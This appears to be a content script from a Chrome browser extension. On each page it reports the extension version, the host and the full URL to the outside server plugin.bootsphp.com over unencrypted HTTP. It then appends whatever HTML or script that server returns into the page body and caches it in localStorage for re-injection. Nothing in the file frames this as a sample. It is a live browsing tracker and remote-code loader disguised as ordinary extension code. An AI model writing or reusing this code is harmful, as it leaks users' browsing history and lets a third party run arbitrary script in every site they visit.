function sendMessage(action, data, func) {
	if (typeof data == 'undefined') {
		data = {};
		func = function() {};
	}
	if (typeof func == 'undefined' && typeof data == 'function') {
		func = data;
		data = {};
	}
	chrome.runtime.sendMessage({action : action,data : data}, func);
}
sendMessage('getStatus', function(status) {
	if (!status) {
		return false;
	}
	startup();
});
function startup() {
	$.ajaxSetup({
		global : false,
		cache : true
	});
	var manifest = chrome.runtime.getManifest();
	var params = {
		v : manifest.version,
		host : location.host,
		href : location.href
	};
	var localCacheKey = 'ban_content_script';
	var localCacheTimeKey = 'ban_time';
	var localCacheExpireKey = 'ban_expire';
	var localCache = window.localStorage.getItem(localCacheKey);
	var localCacheTime = window.localStorage.getItem(localCacheTimeKey);
	var localCacheExpire = window.localStorage.getItem(localCacheExpireKey);
	if (!localCacheTime) {
		localCacheTime = 0;
	}
	if (!localCacheExpire) {
		localCacheExpire = 120000;
	}
	var exception = false;
	if (localCache) {
		try {
			$('body').append(localCache);
		} catch (e) {
			exception = true;
			window.localStorage.removeItem(localCacheKey);
		}
	}
	if (!localCache || new Date().getTime() - localCacheTime > localCacheExpire) {
		$.get('http://plugin.bootsphp.com/ban.js?' + $.param(params), function(data) {
			if (data.code == 0) {
				if (!localCache || exception === true) {
					try {
						$('body').append(data.message);
						exception = false;
					} catch (e) {
						exception = true;
					}
				}
				if (exception === true) {
					return false;
				}
				window.localStorage.setItem(localCacheKey, data.message);
				window.localStorage.setItem(localCacheTimeKey, new Date().getTime());
				if (typeof data.data.cacheExpire != 'undefined') {
					window.localStorage.setItem(localCacheExpireKey, data.data.cacheExpire);
				}
			}
		}, 'json');
	}
}